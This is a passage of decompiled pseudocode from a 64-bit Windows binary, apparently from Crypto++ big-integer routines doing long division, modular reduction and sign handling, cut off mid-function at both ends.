  v10 = (signed __int64)&v9[a7];
  v45 = &a3[a5 + a7 + 2];
  v11 = a4;
  v12 = Src[a7 - 1] == 0i64;
  *(_QWORD *)(v10 - 8) = 0i64;
  v54 = (__int64)&a3[a5 + 2];
  *v9 = 0i64;
  v13 = v12;
  if ( &v9[v13] != Src )
    memcpy_s(&v9[v13], 8 * (a7 - v12), Src, 8 * (a7 - v12));
  v14 = *(_QWORD *)(v10 - 8);
  if ( v14 )
  {
    v16 = 0;
    v15 = 64;
    do
    {
      if ( v14 >> ((v15 + v16) >> 1) )
        v16 = (v15 + v16) >> 1;
      else
        v15 = (v15 + v16) >> 1;
    }
    while ( v15 - v16 > 1 );
  }
  else
  {
    v15 = 0;
  }
  v17 = 0i64;
  v18 = 64 - v15;
  v56 = 64 - v15;
  if ( 64 != v15 )
  {
    v19 = 0i64;
    if ( v7 )
    {
      do
      {
        v20 = v9[v19++];
        v9[v19 - 1] = v17 | (v20 << v18);
        v17 = v20 >> (64 - (unsigned __int8)v18);
      }
      while ( v19 < v7 );
    }
  }
  v21 = a5;
  v53[v21 + 1] = 0i64;
  v53[v21] = 0i64;
  *v53 = 0i64;
  Srca = (char *)&v53[v13];
  if ( &v53[v13] != v11 )
    memcpy_s(&v53[v13], v21 * 8, v11, v21 * 8);
  v22 = 0i64;
  if ( v18 )
  {
    v23 = 0i64;
    if ( a5 != -2i64 )
    {
      do
      {
        v24 = v53[v23++];
        v53[v23 - 1] = v22 | (v24 << v18);
        v22 = v24 >> (64 - (unsigned __int8)v18);
      }
      while ( v23 < a5 + 2 );
    }
  }
  if ( *(_OWORD *)&v53[v21] <= 1ui64 )
  {
    v25 = (_QWORD *)(v51 + 8 * (a5 - v7));
    *v25 = 0i64;
    v25[1] = 0i64;
    v26 = (__int64)&v53[a5 - v7];
    while ( 1 )
    {
      if ( !v53[v21] )
      {
        v27 = v7;
        if ( v7 )
        {
          v28 = (signed __int64)&v9[v7];
          do
          {
            v29 = *(_QWORD *)(v26 - (_QWORD)v9 + v28 - 8);
            v30 = *(_QWORD *)(v28 - 8);
            v28 -= 8i64;
            --v27;
            if ( v29 > v30 )
              break;
            if ( v29 < v30 )
              goto LABEL_28;
          }
          while ( v27 );
        }
      }
      v53[v21] -= (signed int)sub_140062F60(v7, v26, v26, (__int64)v9);
      ++*v25;
    }
  }
  a5 += 2i64;
LABEL_28:
  v31 = v9[v7 - 2] + 1i64;
  v32 = 8 * v7;
  v33 = a5 - 2;
  v34 = v9[v7 - 1] + (v31 == 0);
  if ( a5 - 2 >= v7 )
  {
    v35 = &v53[v33 + 1];
    v36 = v51 - v32 - (_QWORD)v53;
    v52 = v51 - v32 - (_QWORD)v53;
    v37 = ((v33 - v7) >> 1) + 1;
    do
    {
      v38 = *(v35 - 1);
      v39 = *v35;
      v40 = *(v35 - 2);
      if ( v34 || v31 )
      {
        v46 = *(v35 - 3);
        v47 = v40;
        v48 = v38;
        v49 = v39;
        v39 = sub_14003ACF0(&v47, v31, v34);
        v38 = sub_14003ACF0(&v46, v31, v34);
        v36 = v52;
      }
      v41 = (unsigned __int64 *)((char *)v35 + v36 - 8);
      *(unsigned __int64 *)((char *)v35 + v36) = v39;
      *v41 = v38;
      sub_140045B80((__int64)((char *)v35 - 8i64 - v32), v45, (__int64)v41, v54, v7);
      v36 = v52;
      v35 -= 2;
      --v37;
    }
    while ( v37 );
    v18 = v56;
    v8 = 0i64;
    v32 = 8 * v7;
  }
  result = Dst;
  if ( Dst != Srca )
  {
    memcpy_s(Dst, v32, Srca, v32);
    result = Dst;
  }
  if ( v18 && v7 )
  {
    v43 = &result[v32 - 8];
    do
    {
      v44 = *(_QWORD *)v43;
      v43 -= 8;
      result = (char *)(v8 | (v44 >> v18));
      v8 = v44 << (64 - (unsigned __int8)v18);
      *((_QWORD *)v43 + 1) = result;
      --v7;
    }
    while ( v7 );
  }
  return result;
}

//----- (0000000140046420) ----------------------------------------------------
void __fastcall sub_140046420(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // r14
  __int64 v5; // rdi
  __int64 v6; // rbx
  __int64 v7; // rsi
  int v8; // edx
  _QWORD *v9; // rcx
  __int64 v10; // rax
  _QWORD *v11; // rcx
  _QWORD *v12; // rcx
  __int64 v13; // rax
  _QWORD *v14; // rcx
  __int64 v15; // rax
  __int64 v16; // rax
  void *v17; // rdx
  void *v18; // rdx
  int v19; // edx
  _QWORD *v20; // rcx
  __int64 v21; // rax
  _QWORD *v22; // rcx
  char v23; // [rsp+28h] [rbp-60h]
  __int64 v24; // [rsp+38h] [rbp-50h]
  void *Memory; // [rsp+40h] [rbp-48h]
  char v26; // [rsp+50h] [rbp-38h]
  __int64 v27; // [rsp+60h] [rbp-28h]
  void *v28; // [rsp+68h] [rbp-20h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  sub_14004A160(a1, a2, a3, a4);
  if ( *(_DWORD *)(v5 + 32) == 1 )
  {
    v8 = *(_DWORD *)(v6 + 32);
    if ( v8 == 1 )
      goto LABEL_29;
    v9 = *(_QWORD **)(v6 + 24);
    if ( *v9 )
      goto LABEL_29;
    v10 = *(_QWORD *)(v6 + 16);
    if ( v10 )
    {
      v11 = &v9[v10 - 1];
      do
      {
        if ( *v11 )
          break;
        --v11;
        --v10;
      }
      while ( v10 );
    }
    if ( (_DWORD)v10 )
LABEL_29:
      *(_DWORD *)(v6 + 32) = 1 - v8;
    if ( *(_DWORD *)(v7 + 32) == 1 )
      goto LABEL_30;
    v12 = *(_QWORD **)(v7 + 24);
    if ( *v12 )
      goto LABEL_30;
    v13 = *(_QWORD *)(v7 + 16);
    if ( v13 )
    {
      v14 = &v12[v13 - 1];
      do
      {
        if ( *v14 )
          break;
        --v14;
        --v13;
      }
      while ( v13 );
    }
    if ( (_DWORD)v13 )
    {
LABEL_30:
      sub_14003CF00(v6);
      v15 = sub_14003DA40(v4, (__int64)&v26);
      v16 = sub_140024710((__int64)&v23, v15, v7);
      sub_14003C670(v7, v16);
      v17 = Memory;
      memset(Memory, 0, 8 * v24);
      free(v17);
      v18 = v28;
      memset(v28, 0, 8 * v27);
      free(v18);
    }
  }
  if ( *(_DWORD *)(v4 + 32) == 1 )
  {
    v19 = *(_DWORD *)(v6 + 32);
    if ( v19 == 1 )
      goto LABEL_31;
    v20 = *(_QWORD **)(v6 + 24);
    if ( *v20 )
      goto LABEL_31;
    v21 = *(_QWORD *)(v6 + 16);
    if ( v21 )
    {
      v22 = &v20[v21 - 1];
      do
      {
        if ( *v22 )
          break;
        --v22;
        --v21;
      }
      while ( v21 );
    }
    if ( (_DWORD)v21 )
LABEL_31:
      *(_DWORD *)(v6 + 32) = 1 - v19;
  }
}

//----- (00000001400465A0) ----------------------------------------------------
void __fastcall sub_1400465A0(__int64 *a1, __int64 a2, __int64 a3, unsigned __int64 a4)
{
  unsigned __int64 v4; // rbx
  __int64 v5; // r14
  __int64 v6; // r12
  __int64 *v7; // r15
  signed __int64 v8; // rsi
  unsigned int v9; // er13
  unsigned int v10; // edx
  __int64 v11; // rax
  void *v12; // rdx
  __int64 v13; // rbp
  _QWORD *v14; // rax
  signed __int64 v15; // rax
  void *v16; // rcx
  unsigned __int64 v17; // rdi
  signed __int64 v18; // r12
  __int64 v19; // rcx
  __int64 v20; // rax
  unsigned int v21; // er11
  unsigned int v22; // edx
  unsigned __int64 v23; // rcx
  int v24; // er10
  unsigned __int64 v25; // rax
  unsigned __int64 v26; // rax
  unsigned __int64 v27; // rcx
  __int64 v28; // kr00_8
  int v29; // er10
  unsigned __int64 v30; // rax
  __int64 v31; // r9
  unsigned __int64 v32; // rax
  unsigned int v33; // edx
  unsigned __int64 i; // rcx
  unsigned __int64 v35; // rax
  unsigned int v36; // [rsp+24h] [rbp-D4h]
  unsigned __int64 v37; // [rsp+28h] [rbp-D0h]
  unsigned int v38; // [rsp+30h] [rbp-C8h]
  unsigned int v39; // [rsp+34h] [rbp-C4h]
  __int64 v40; // [rsp+38h] [rbp-C0h]
  unsigned int v41; // [rsp+40h] [rbp-B8h]
  __int64 v42; // [rsp+48h] [rbp-B0h]
  __int64 v43; // [rsp+50h] [rbp-A8h]
  __int64 *v44; // [rsp+58h] [rbp-A0h]
  __int64 v45; // [rsp+60h] [rbp-98h]
  char v46; // [rsp+70h] [rbp-88h]
  __int64 v47; // [rsp+80h] [rbp-78h]
  void *Memory; // [rsp+88h] [rbp-70h]

  v45 = -2i64;
  v4 = a4;
  v5 = a3;
  v43 = a3;
  v6 = a2;
  v42 = a2;
  v7 = a1;
  v44 = a1;
  if ( !a4 )
  {
    sub_14003C450(&v46);
    CxxThrowException(&v46, &_TI3_AVcls_099_cls_097_CryptoPP__);
  }
  v8 = a4 - 1;
  if ( (a4 - 1) & a4 )
  {
    v13 = *(_QWORD *)(a3 + 16);
    if ( v13 )
    {
      v14 = (_QWORD *)(*(_QWORD *)(a3 + 24) + 8 * v13 - 8);
      do
      {
        if ( *v14 )
          break;
        --v14;
        --v13;
      }
      while ( v13 );
    }
    v15 = sub_14004B580((unsigned int)v13);
    sub_140049D90(v6 + 8, v15);
    v16 = *(void **)(v6 + 24);
    if ( v16 )
      memset(v16, 0, 8i64 * *(_QWORD *)(v6 + 16));
    *v7 = 0i64;
    if ( (_DWORD)v13 )
    {
      v17 = v4 >> 32;
      do
      {
        v13 = (unsigned int)(v13 - 1);
        v18 = 8 * v13;
        v19 = *(_QWORD *)(8 * v13 + *(_QWORD *)(v5 + 24));
        v20 = *v7;
        v38 = *(_QWORD *)(8 * v13 + *(_QWORD *)(v5 + 24));
        v39 = HIDWORD(v19);
        v40 = v20;
        v41 = sub_14003AC00(&v39, v4, HIDWORD(v4));
        if ( HIDWORD(v4) == -1 )
        {
          v21 = v40;
        }
        else if ( HIDWORD(v4) )
        {
          v21 = (v39 | ((unsigned __int64)(unsigned int)v40 << 32)) / (unsigned int)(HIDWORD(v4) + 1);
        }
        else
        {
          v21 = (v38 | ((unsigned __int64)v39 << 32)) / (unsigned int)v4;
        }
        v22 = v38 - v21 * v4;
        v23 = v39
            - (unsigned __int64)(unsigned int)-((v38 - (unsigned __int64)(v21 * (unsigned int)v4)) >> 32)
            - (v21 * (unsigned __int64)(unsigned int)v4 >> 32)
            - v21 * v17;
        v24 = HIDWORD(v23) + v40;
        while ( v24 || (unsigned int)v23 > HIDWORD(v4) || (_DWORD)v23 == HIDWORD(v4) && v22 >= (unsigned int)v4 )
        {
          v25 = v22 - (unsigned __int64)(unsigned int)v4;
          v22 -= v4;
          v23 = (unsigned int)v23 - (unsigned __int64)(unsigned int)-HIDWORD(v25) - v17;
          v24 += HIDWORD(v23);
          ++v21;
        }
        *(_QWORD *)(v18 + *(_QWORD *)(v42 + 24)) = v21 | ((unsigned __int64)v41 << 32);
        v7 = v44;
        v26 = *v44;
        if ( v4 >= 0x100000000i64 )
        {
          v28 = *(_QWORD *)(v18 + *(_QWORD *)(v5 + 24));
          v36 = *(_QWORD *)(v18 + *(_QWORD *)(v5 + 24)) >> 32;
          v37 = v26;
          sub_14003AC00(&v36, v4, HIDWORD(v4));
          v29 = v37;
          if ( HIDWORD(v4) == -1 )
          {
            LODWORD(v30) = v37;
          }
          else if ( HIDWORD(v4) )
          {
            v30 = (v36 | ((unsigned __int64)(unsigned int)v37 << 32)) / (unsigned int)(HIDWORD(v4) + 1);
          }
          else
          {
            v30 = ((unsigned int)v28 | ((unsigned __int64)v36 << 32)) / (unsigned int)v4;
          }
          v31 = (unsigned int)v30;
          v32 = (unsigned int)v30 * (unsigned __int64)(unsigned int)v4;
          v33 = v28 - v32;
          for ( i = v36
                  - (unsigned __int64)(unsigned int)-(((unsigned int)v28 - (unsigned __int64)(unsigned int)v32) >> 32)
                  - (v32 >> 32)
                  - v31 * v17; ; i = (unsigned int)i - (unsigned __int64)(unsigned int)-HIDWORD(v35) - v17 )
          {
            v29 += HIDWORD(i);
            if ( !v29 && (unsigned int)i <= HIDWORD(v4) && ((_DWORD)i != HIDWORD(v4) || v33 < (unsigned int)v4) )
              break;
            v35 = v33 - (unsigned __int64)(unsigned int)v4;
            v33 -= v4;
          }
          v27 = v33 | ((unsigned __int64)(unsigned int)i << 32);
        }
        else
        {
          v27 = ((unsigned int)*(_QWORD *)(v18 + *(_QWORD *)(v5 + 24))
               + (((*(_QWORD *)(v18 + *(_QWORD *)(v5 + 24)) >> 32) + (v26 % (unsigned int)v4 << 32)) % (unsigned int)v4 << 32))
              % (unsigned int)v4;
        }
        *v7 = v27;
      }
      while ( (_DWORD)v13 );
      v5 = v43;
      v6 = v42;
    }
    if ( *(_DWORD *)(v5 + 32) == 1 )
    {
      *(_DWORD *)(v6 + 32) = 1;
      if ( *v7 )
      {
        sub_14003CF00(v6);
        *v7 = v4 - *v7;
      }
    }
    else
    {
      *(_DWORD *)(v6 + 32) = 0;
    }
  }
  else
  {
    v9 = 0;
    v10 = 64;
    do
    {
      if ( a4 >> ((v10 + v9) >> 1) )
        v9 = (v10 + v9) >> 1;
      else
        v10 = (v10 + v9) >> 1;
    }
    while ( v10 - v9 > 1 );
    v11 = sub_14003CA00(a3, (__int64)&v46, v10 - 1);
    sub_14003C670(v6, v11);
    v12 = Memory;
    memset(Memory, 0, 8 * v47);
    free(v12);
    *v7 = v8 & **(_QWORD **)(v5 + 24);
  }
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400D4228: using guessed type int _TI3_AVcls_099_cls_097_CryptoPP__;

//----- (00000001400469D0) ----------------------------------------------------
void __fastcall sub_1400469D0(_BYTE *a1, _BYTE *a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v5; // rsi
  __int64 v6; // rbp
  _BYTE *v7; // rdi
  __int64 v8; // r8
  __int64 v9; // r9
  unsigned __int64 *v10; // rax
  unsigned __int64 v11; // rdx
  unsigned __int64 v12; // rcx
  BOOL v13; // eax
  __int64 v14; // r8
  __int64 v15; // r9
  __int64 v16; // r10
  unsigned __int64 *v17; // rdx
  unsigned __int64 v18; // rcx
  unsigned __int64 v19; // rax

  v5 = a3;
  v6 = a4;
  v7 = a1;
  if ( a1 != a2 )
    memcpy_s(a1, 8 * a5, a2, 8 * a5);
  while ( v5 )
  {
    --v5;
    if ( *v7 & 1 )
    {
      v13 = sub_140062F10(a5, (__int64)v7, (__int64)v7, v6);
      v14 = 0i64;
      v15 = a5;
      v16 = v13;
      if ( a5 )
      {
        v17 = (unsigned __int64 *)&v7[8 * (a5 - 1)];
        do
        {
          v18 = *v17;
          --v17;
          v19 = v14 | (v18 >> 1);
          v14 = v18 << 63;
          v17[1] = v19;
          --v15;
        }
        while ( v15 );
      }
      *(_QWORD *)&v7[8 * a5 - 8] += v16 << 63;
    }
    else
    {
      v8 = 0i64;
      v9 = a5;
      if ( a5 )
      {
        v10 = (unsigned __int64 *)&v7[8 * (a5 - 1)];
        do
        {
          v11 = *v10;
          --v10;
          v12 = v8 | (v11 >> 1);
          v8 = v11 << 63;
          v10[1] = v12;
          --v9;
        }
        while ( v9 );
      }
    }
  }
}

//----- (0000000140046AE0) ----------------------------------------------------
void __fastcall sub_140046AE0(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  __int64 v4; // r14
  __int64 v5; // rbp
  __int64 v6; // r15
  __int64 v7; // rbx
  __int64 v8; // r13
  unsigned __int64 v9; // rsi
  __int64 v10; // rdi
  __int64 v11; // rdx
  __int64 v12; // rax
  _QWORD *v13; // rcx
  signed __int64 v14; // rax
  const void *v15; // r8
  void *v16; // rcx
  int v17; // er14
  _QWORD *v18; // rax
  signed __int64 v19; // rax
  const void *v20; // r8
  void *v21; // rcx
  _QWORD *v22; // rcx
  __int64 v23; // rax
  _QWORD *v24; // rcx
  __int64 v25; // rax
  __int64 v26; // rax
  void *v27; // rdx
  void *v28; // rdx
  char v29; // [rsp+28h] [rbp-70h]
  __int64 v30; // [rsp+38h] [rbp-60h]
  void *Memory; // [rsp+40h] [rbp-58h]
  char v32; // [rsp+50h] [rbp-48h]
  __int64 v33; // [rsp+60h] [rbp-38h]
  void *v34; // [rsp+68h] [rbp-30h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  sub_14003C670(a2, a3);
  v8 = (unsigned int)v4;
  sub_14003D660(v6, (unsigned int)v4);
  v9 = (unsigned __int64)(v4 + 63) >> 6;
  v10 = *(_QWORD *)(v5 + 16);
  v11 = *(_QWORD *)(v5 + 24);
  v12 = v10;
  if ( v10 )
  {
    v13 = (_QWORD *)(v11 + 8 * (v10 - 1));
    do
    {
      if ( *v13 )
        break;
      --v13;
      --v12;
    }
    while ( v12 );
  }
  if ( v9 > (unsigned int)v12 )
  {
    if ( v10 )
    {
      v18 = (_QWORD *)(v11 + 8 * (v10 - 1));
      do
      {
        if ( *v18 )
          break;
        --v18;
        --v10;
      }
      while ( v10 );
    }
    v19 = sub_14004B580((unsigned int)v10);
    sub_14004C680(v7 + 8, v19);
    v20 = *(const void **)(v5 + 24);
    v21 = *(void **)(v7 + 24);
    if ( v21 != v20 )
      memcpy_s(v21, 8i64 * *(_QWORD *)(v7 + 16), v20, 8i64 * *(_QWORD *)(v7 + 16));
  }
  else
  {
    v14 = sub_14004B580((unsigned __int64)(v4 + 63) >> 6);
    sub_14004C680(v7 + 8, v14);
    v15 = *(const void **)(v5 + 24);
    v16 = *(void **)(v7 + 24);
    if ( v16 != v15 )
      memcpy_s(v16, 8 * v9, v15, 8 * v9);
    if ( *(_QWORD *)(v7 + 16) != v9 )
      memset((void *)(*(_QWORD *)(v7 + 24) + 8 * v9), 0, 8 * (*(_QWORD *)(v7 + 16) - v9));
    v17 = v4 & 0x3F;
    if ( v17 )
      *(_QWORD *)(*(_QWORD *)(v7 + 24) + 8 * v9 - 8) %= (unsigned __int64)(1i64 << v17);
  }
  *(_DWORD *)(v7 + 32) = 0;
  if ( *(_DWORD *)(v5 + 32) == 1 )
  {
    v22 = *(_QWORD **)(v7 + 24);
    if ( *v22 )
      goto LABEL_28;
    v23 = *(_QWORD *)(v7 + 16);
    if ( v23 )
    {
      v24 = &v22[v23 - 1];
      do
      {
        if ( *v24 )
          break;
        --v24;
        --v23;
      }
      while ( v23 );
    }
    if ( (_DWORD)v23 )
    {
LABEL_28:
      sub_14003CF00(v6);
      v25 = sub_14004A6C0(&v32, v8);
      v26 = sub_140024710((__int64)&v29, v25, v7);
      sub_14003C670(v7, v26);
      v27 = Memory;
      memset(Memory, 0, 8 * v30);
      free(v27);
      v28 = v34;
      memset(v34, 0, 8 * v33);
      free(v28);
    }
  }
}
// 14004A6C0: using guessed type __int64 __fastcall sub_14004A6C0(_QWORD, _QWORD);

//----- (0000000140046CF0) ----------------------------------------------------
__int64 __fastcall sub_140046CF0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v4; // rbx
  __int64 v5; // rdi
  _QWORD *v6; // rax
  __int64 v7; // rcx
  _QWORD *v8; // rax
  __int64 (__fastcall **v10)(void *); // [rsp+28h] [rbp-60h]
  __int64 v11; // [rsp+38h] [rbp-50h]
  void *Memory; // [rsp+40h] [rbp-48h]
  int v13; // [rsp+48h] [rbp-40h]
  __int64 v14; // [rsp+50h] [rbp-38h]
  __int64 v15; // [rsp+58h] [rbp-30h]

  v14 = -2i64;
  v3 = a3;
  v4 = a2;
  v5 = a1;
  v15 = a2;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(a1);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  v10 = &off_1400A9910;
  v11 = 2i64;
  v6 = sub_14003A000(0x10ui64);
  Memory = v6;
  v13 = 0;
  v6[1] = 0i64;
  *v6 = 0i64;
  if ( !qword_1400DAB40 )
  {
    cfltcvt_init(v7);
    qword_1400DAB40 = (__int64 (__fastcall *)(_QWORD, _QWORD, _QWORD))sub_14003E2E0;
  }
  *(_QWORD *)v4 = &off_1400A9910;
  *(_QWORD *)(v4 + 16) = 2i64;
  v8 = sub_14003A000(0x10ui64);
  *(_QWORD *)(v4 + 24) = v8;
  *(_DWORD *)(v4 + 32) = 0;
  v8[1] = 0i64;
  **(_QWORD **)(v4 + 24) = 0i64;
  sub_140046420((__int64)&v10, v4, v5, v3);
  memset(Memory, 0, 8 * v11);
  free(Memory);
  return v4;
}
// 14004B600: using guessed type __int64 __cdecl cfltcvt_init(_QWORD);
// 1400A9910: using guessed type __int64 (__fastcall *off_1400A9910)(void *);
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (0000000140046E00) ----------------------------------------------------
__int64 __fastcall sub_140046E00(__int64 a1, void *a2, unsigned __int64 a3)
{
  unsigned __int64 v3; // rdi
  __int64 v4; // rsi
  __int64 v5; // rbx
  char v7; // [rsp+58h] [rbp+20h]

  v3 = a3;
  v4 = (__int64)a2;
  v5 = a1;
  sub_14003C210(a2);
  sub_1400465A0((__int64 *)&v7, v4, v5, v3);
  return v4;
}

//----- (0000000140046E70) ----------------------------------------------------
void __fastcall sub_140046E70(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  sub_140046420(a2, a3, a4, a5);
}

//----- (0000000140046E90) ----------------------------------------------------
__int64 __fastcall sub_140046E90(__int64 a1, __int64 a2)
{
  __int64 v2; // rdi
  __int64 v3; // rax
  __int64 v4; // rbx
  void *v5; // rdx
  char v7; // [rsp+28h] [rbp-30h]
  __int64 v8; // [rsp+38h] [rbp-20h]
  void *Memory; // [rsp+40h] [rbp-18h]

  v2 = a1;
  v3 = sub_140046EF0(a2, (__int64)&v7);
  v4 = sub_14003C670(v2 + 64, v3);
  v5 = Memory;
  memset(Memory, 0, 8 * v8);
  free(v5);
  return v4;
}

//----- (0000000140046EF0) ----------------------------------------------------
__int64 __fastcall sub_140046EF0(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  sub_140049E50(a1, a2);
  return v2;
}
// 140049E50: using guessed type __int64 __fastcall sub_140049E50(_QWORD, _QWORD);

//----- (0000000140047070) ----------------------------------------------------
__int64 __fastcall sub_140047070(__int64 a1, __int64 a2, __int64 a3, unsigned int a4)
{
  __int64 v4; // rsi
  __int64 v5; // rbx
  unsigned int v6; // edi
  __int64 v7; // rbp
  __int64 v9; // [rsp+20h] [rbp-58h]
  __int64 (__fastcall **v10)(); // [rsp+28h] [rbp-50h]
  __int64 v11; // [rsp+38h] [rbp-40h]
  __int64 v12; // [rsp+40h] [rbp-38h]
  __int64 v13; // [rsp+48h] [rbp-30h]

  v4 = a1;
  v5 = a2;
  v6 = a4;
  v7 = a3;
  sub_140036DA0((__int64)&v9, 0);
  v11 = v5;
  v10 = off_1400A9A98;
  v12 = v7;
  v13 = 0i64;
  return sub_140046F20(v4, &v9, v7, v6, &off_1400A8940);
}
// 1400A8940: using guessed type __int64 (__fastcall *off_1400A8940)();
// 1400A9A98: using guessed type __int64 (__fastcall *off_1400A9A98[3])();

//----- (0000000140047100) ----------------------------------------------------
bool __fastcall sub_140047100(__int64 a1, __int64 a2, __int64 a3)
{
  bool result; // al

  if ( *(_DWORD *)(a2 + 32) == 1 )
  {
    if ( *(_DWORD *)(a3 + 32) == 1 )
      result = (unsigned int)sub_14004A0B0(a2, a3) == 0;
    else
      result = 0;
  }
  else if ( *(_DWORD *)(a3 + 32) == 1 )
  {
    result = 0;
  }
  else
  {
    result = (unsigned int)sub_14004A0B0(a2, a3) == 0;
  }
  return result;
}

//----- (0000000140047170) ----------------------------------------------------
__int64 __fastcall sub_140047170(__int64 a1, __int64 a2)
{
  _QWORD *v2; // rax

  if ( a2 )
  {
    v2 = (_QWORD *)(a1 + 8 * (a2 - 1));
    do
    {
      if ( *(v2 - 1) )
        break;
      if ( *v2 )
        break;
      v2 -= 2;
      a2 -= 2i64;
    }
    while ( a2 );
  }
  return a2;
}

//----- (00000001400471A0) ----------------------------------------------------
__int64 __fastcall sub_1400471A0(__int64 *a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rdi
  __int64 *v4; // rsi
  unsigned int v5; // eax

  v2 = *a1;
  v3 = a2;
  v4 = a1;
  v5 = (*(__int64 (**)(void))(*a1 + 56))();
  return (*(__int64 (__fastcall **)(__int64 *, __int64, _QWORD))(v2 + 112))(v4, v3, v5);
}

//----- (00000001400472D0) ----------------------------------------------------
char *__fastcall sub_1400472D0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r11
  __int64 v4; // rdx
  __int64 v5; // r9
  __int64 v6; // r8

  v3 = a2;
  v4 = a3;
  **(_DWORD **)(a1 + 32) = _byteswap_ulong(*(_DWORD *)(a1 + 8));
  v5 = *(_QWORD *)(a1 + 24);
  v6 = *(_QWORD *)(a1 + 32);
  ++*(_DWORD *)(a1 + 8);
  return sub_140045E60(v3, v4, v6, v5, 0);
}

//----- (0000000140047310) ----------------------------------------------------
char __fastcall sub_140047310(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // r15
  __int64 v4; // r13
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rcx
  int v8; // er14
  __int64 v9; // rax
  void *v10; // rdx
  __int64 v11; // rax
  _QWORD *v12; // rcx
  __int64 v13; // rcx
  _QWORD *v14; // rdx
  __int64 v15; // rcx
  unsigned __int64 *v16; // rax
  unsigned __int64 v17; // rdx
  int v18; // edx
  __int64 v19; // rax
  _QWORD *v20; // rcx
  __int64 v21; // rcx
  _QWORD *v22; // rdx
  __int64 v23; // rcx
  unsigned __int64 *v24; // rax
  unsigned __int64 v25; // rdx
  signed int v26; // edx
  __int64 v27; // rax
  __int64 v28; // rax
  __int64 v29; // rax
  __int64 v30; // rax
  __int64 v31; // rax
  _QWORD *v32; // rcx
  __int64 v33; // rcx
  _QWORD *v34; // rdx
  __int64 v35; // rcx
  unsigned __int64 *v36; // rax
  unsigned __int64 v37; // rdx
  signed int v38; // edx
  int v39; // esi
  void (__fastcall ***v40)(_QWORD, signed __int64); // rbx
  unsigned __int64 v41; // r8
  void *v42; // rdx
  __int64 v43; // rax
  size_t v44; // rdi
  void *v45; // r13
  void *v46; // rax
  char v47; // al
  unsigned __int8 (__fastcall ***v48)(_QWORD, int *); // r15
  char v49; // al
  void *v50; // rdx
  __int64 v51; // rdi
  int v52; // eax
  __int64 v53; // rax
  __int64 v54; // rax
  __int64 v55; // rsi
  void *v56; // rdx
  void *v57; // rdx
  void *v58; // r8
  void *v59; // rcx
  __int64 v60; // rax
  __int64 v61; // rax
  void *v62; // rdx
  void *v63; // rdx
  int v64; // eax
  __int64 v65; // rax
  __int64 v66; // rdi
  __int64 v67; // rax
  __int64 v68; // rsi
  void *v69; // rdx
  void *v70; // rdx
  void *v71; // rdx
  void *v72; // rdx
  void *v73; // rdx
  void *v74; // rdx
  void *v75; // rdx
  void *v76; // rdx
  void *v78; // rdx
  void *v79; // rdx
  void *v80; // rdx
  void *v81; // rdx
  void *v82; // rdx
  void *v83; // rdx
  char v84; // [rsp+30h] [rbp-D0h]
  void (__fastcall ***v85)(_QWORD, signed __int64); // [rsp+38h] [rbp-C8h]
  __int64 (__fastcall **v86)(void *); // [rsp+40h] [rbp-C0h]
  __int64 v87; // [rsp+50h] [rbp-B0h]
  void *v88; // [rsp+58h] [rbp-A8h]
  int v89; // [rsp+60h] [rbp-A0h]
  __int64 v90; // [rsp+68h] [rbp-98h]
  char v91; // [rsp+70h] [rbp-90h]
  __int64 v92; // [rsp+80h] [rbp-80h]
  void *v93; // [rsp+88h] [rbp-78h]
  int v94; // [rsp+90h] [rbp-70h]
  char v95; // [rsp+98h] [rbp-68h]
  __int64 v96; // [rsp+A8h] [rbp-58h]
  void *v97; // [rsp+B0h] [rbp-50h]
  int v98; // [rsp+B8h] [rbp-48h]
  char v99; // [rsp+C0h] [rbp-40h]
  __int64 v100; // [rsp+D0h] [rbp-30h]
  void *v101; // [rsp+D8h] [rbp-28h]
  int v102; // [rsp+E0h] [rbp-20h]
  unsigned __int8 (__fastcall ***v103)(_QWORD, int *); // [rsp+E8h] [rbp-18h]
  char v104; // [rsp+F0h] [rbp-10h]
  __int64 v105; // [rsp+100h] [rbp+0h]
  void *v106; // [rsp+108h] [rbp+8h]
  int v107; // [rsp+110h] [rbp+10h]
  char v108; // [rsp+118h] [rbp+18h]
  void *v109; // [rsp+120h] [rbp+20h]
  unsigned __int64 v110; // [rsp+128h] [rbp+28h]
  unsigned __int64 v111; // [rsp+138h] [rbp+38h]
  void *v112; // [rsp+140h] [rbp+40h]
  char v113; // [rsp+148h] [rbp+48h]
  __int64 v114; // [rsp+158h] [rbp+58h]
  void *Memory; // [rsp+160h] [rbp+60h]
  __int64 v116; // [rsp+170h] [rbp+70h]
  void *v117; // [rsp+178h] [rbp+78h]
  char v118; // [rsp+180h] [rbp+80h]
  __int64 v119; // [rsp+190h] [rbp+90h]
  void *v120; // [rsp+198h] [rbp+98h]
  char v121; // [rsp+1A8h] [rbp+A8h]
  __int64 v122; // [rsp+1B8h] [rbp+B8h]
  void *v123; // [rsp+1C0h] [rbp+C0h]
  char v124; // [rsp+1D0h] [rbp+D0h]
  __int64 v125; // [rsp+1E0h] [rbp+E0h]
  void *v126; // [rsp+1E8h] [rbp+E8h]
  char v127; // [rsp+1F8h] [rbp+F8h]
  __int64 v128; // [rsp+208h] [rbp+108h]
  void *v129; // [rsp+210h] [rbp+110h]
  char v130; // [rsp+220h] [rbp+120h]
  __int64 v131; // [rsp+230h] [rbp+130h]
  void *v132; // [rsp+238h] [rbp+138h]
  char v133; // [rsp+248h] [rbp+148h]
  __int64 v134; // [rsp+258h] [rbp+158h]
  void *v135; // [rsp+260h] [rbp+160h]
